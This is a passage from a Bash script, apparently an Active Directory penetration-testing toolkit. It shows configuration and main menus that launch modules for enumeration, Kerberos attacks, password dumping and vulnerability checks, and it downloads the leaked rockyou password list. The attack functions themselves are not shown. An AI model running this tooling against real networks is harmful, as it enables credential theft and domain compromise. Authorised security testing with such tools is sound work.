        if [ ! -f "${enum4linux_path}" ] ; then echo -e "${RED}[-] enum4linux-ng is not installed${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is installed${NC}"; fi
        if [ ! -f "${scripts_dir}/kerbrute" ] ; then echo -e "${RED}[-] kerbrute is not installed${NC}"; else echo -e "${GREEN}[+] kerbrute is installed${NC}"; fi
        if [ ! -f "${scripts_dir}/CVE-2022-33679.py" ] ; then echo -e "${RED}[-] CVE-2022-33679 is not installed${NC}"; else echo -e "${GREEN}[+] CVE-2022-33679 is installed${NC}"; fi
        config_menu
        ;;

        2)
        echo -e ""
        echo -e "Please specify new output folder:"
        read -p ">> " output_dir_new </dev/tty
        if [ ! "${output_dir_new}" == "" ]; then
            mkdir -p $output_dir_new 2>/dev/null
            output_dir=$output_dir_new
            echo -e "${GREEN}[+] Output folder updated${NC}"
        else
            echo -e "${RED}[-] Error updating output folder${NC}"
        fi
        config_menu
        ;;

        3)
        echo -e ""
        sudo timedatectl set-ntp 0
        sudo ntpdate ${dc_ip}
        echo -e "${GREEN}[+] NTP sync complete${NC}"
        config_menu
        ;;

        4)
        echo -e "" | sudo tee -a /etc/hosts
        echo -e "${dc_ip}\t${dc_domain}" | sudo tee -a /etc/hosts
        echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
        config_menu
        ;;

        5)
        echo -e ""
        echo -e "Content of /etc/resolv.conf before update:"
        echo -e "------------------------------------------"
        cat /etc/resolv.conf
        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
        echo -e "${GREEN}[+] DNS update complete${NC}"
        config_menu
        ;;

        6)
        echo -e ""
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -O "$wordlists_dir/rockyou.txt.tar.gz"
        gunzip "$wordlists_dir/rockyou.txt.tar.gz"
        tar xf "$wordlists_dir/rockyou.txt.tar" -C "$wordlists_dir/"
        chmod 644 "$wordlists_dir/rockyou.txt"
        rm "$wordlists_dir/rockyou.txt.tar"
        wget -q "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt" -O "$wordlists_dir/cirt-default-usernames.txt"
        pass_list="$wordlists_dir/rockyou.txt"
        users_list="$wordlists_dir/xato-net-10-million-usernames.txt"
        echo -e "${GREEN}[+] Default username and password wordlists downloaded${NC}"
        config_menu
        ;;

        7)
        echo -e "Please specify new users wordlist file:"
        read -p ">> " users_list </dev/tty
        echo -e "${GREEN}[+] Users wordlist file updated${NC}"
        config_menu
        ;;

        8)
        echo -e "Please specify new passwords wordlist file:"
        read -p ">> " pass_list </dev/tty
        echo -e "${GREEN}[+] Passwords wordlist file updated${NC}"
        config_menu
        ;;

        9)
        echo -e "Please specify new custom servers list file:"
        read -p ">> " servers_list </dev/tty
        echo -e "${GREEN}[+] Custom servers list updated${NC}"
        config_menu
        ;;

        10)
        echo ""
        print_info
        config_menu
        ;;

        "")
        main_menu
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        config_menu
        ;;
    esac
}

main_menu () {
    echo -e ""
    echo -e "${PURPLE}[Main menu]${NC} Please choose from the following options:"
    echo -e "-----------------------------------------------------"
    echo -e "C) Configuration Menu"
    echo -e "1) Run DNS Enumeration using adidnsdump"
    echo -e "2) Active Directory Enumeration Menu"
    echo -e "3) Kerberos Attacks Menu"
    echo -e "4) SMB shares Enumeration Menu"
    echo -e "5) Vulnerability Checks Menu"
    echo -e "6) Password Dump Menu"
    echo -e "7) Run MSSQL Enumeration"
    echo -e "99) Quit"

    read -p "> " option_selected </dev/tty

    case ${option_selected} in
        C)
        config_menu
        ;;

        1)
        dns_enum
        main_menu
        ;;

        2)
        ad_menu
        ;;

        3)
        kerberos_menu
        ;;

        4)
        shares_menu
        ;;

        5)
        vulns_menu
        ;;

        6)
        pwd_menu
        ;;

        7)
        mssql_enum
        main_menu
        ;;

        99)
        exit 1
        ;;

        *)
        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
        echo -e ""
        main_menu
        ;;
    esac
}

main () { 
    print_banner
    prepare
    print_info
    echo -e ""
    if [[ "$modules" == *"interactive"* ]]; then
        modules="interactive"
        config_menu
    else
        for i in $(echo $modules | sed "s/,/ /g"); do
            case $i in
                ad_enum)
                dns_enum
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e ""
                ;;

                kerberos)
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e ""
                ;;

                scan_shares)
                dns_enum
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                ;;

                pwd_dump)
                dns_enum
                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
                echo -e "${GREEN}---------------------------------${NC}"
                echo -e ""
                pwd_dump
                ;;

                mssql_enum)
                dns_enum
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                echo -e ""
                ;;

                vuln_checks)
                dns_enum
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e ""
                ;;

                all)
                dns_enum
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                echo -e "${GREEN}[+] Module Started: Password Dump${NC}"
                echo -e "${GREEN}---------------------------------${NC}"
                echo -e ""
                pwd_dump
                ;;

                user)
                dns_enum
                echo -e "${GREEN}[+] Module Started: Active Directory Enumeration${NC}"
                echo -e "${GREEN}------------------------------------------------${NC}"
                echo -e ""
                ad_enum
                echo -e "${GREEN}[+] Module Started: Kerberos-based Attacks${NC}"
                echo -e "${GREEN}------------------------------------------${NC}"
                echo -e ""
                kerberos
                echo -e "${GREEN}[+] Module Started: Network Shares Scan${NC}"
                echo -e "${GREEN}---------------------------------------${NC}"
                echo -e ""
                scan_shares
                echo -e "${GREEN}[+] Module Started: Vulnerability Checks${NC}"
                echo -e "${GREEN}----------------------------------------${NC}"
                echo -e ""
                vuln_checks
                echo -e "${GREEN}[+] Module Started: MSSQL Enumeration${NC}"
                echo -e "${GREEN}-------------------------------------${NC}"
                echo -e ""
                mssql_enum
                ;;

                *)
                echo -e "${RED}[-] Unknown module $i... ${NC}"
                echo -e ""
                ;;
            esac
        done

        echo -e ""
        echo -e "${GREEN}[+] All modules have completed. Output folder is: $(realpath $output_dir)${NC}"
        echo -e "${GREEN}-------------------------------------------------${NC}"

    fi
}

main
